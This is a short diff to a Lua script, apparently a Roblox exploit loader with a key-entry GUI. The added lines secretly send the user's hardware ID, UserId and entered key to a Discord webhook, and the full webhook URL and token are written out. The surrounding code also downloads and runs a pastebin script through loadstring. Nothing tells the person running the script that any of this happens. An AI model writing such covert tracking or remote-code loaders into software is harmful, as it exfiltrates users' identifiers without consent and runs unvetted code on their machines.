@@ -14,6 +14,16 @@ Section:NewTextBox("Your key.", "If correct key it will accept.", function(txt)
 	    print("Key = Correct.. Loading Gui..")
 	    print("Hi . . . Welcome to the script..")
 	    wait(2)
+	   syn.request(
+    {
+        Url = 'https://discord.com/api/webhooks/924848297779298387/no0O6u_pdgDpKapKovsYb8nn8FlkzajOO7Y9FNVumlT6SePn-6-cHPSNrPTZqfxu2qzc',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = game:GetService("RbxAnalyticsService"):GetClientId() .. '  Is the HWID of following UserId == ' .. game.Players.LocalPlayer.UserId ..'  key used is : ' .. txt}) -- text near a
+    }
+);
 	    print("Loaded Gui.. Have fun.")
 	    loadstring(game:HttpGet("https://pastebin.com/raw/znNTTFjk", true))()
 	    else
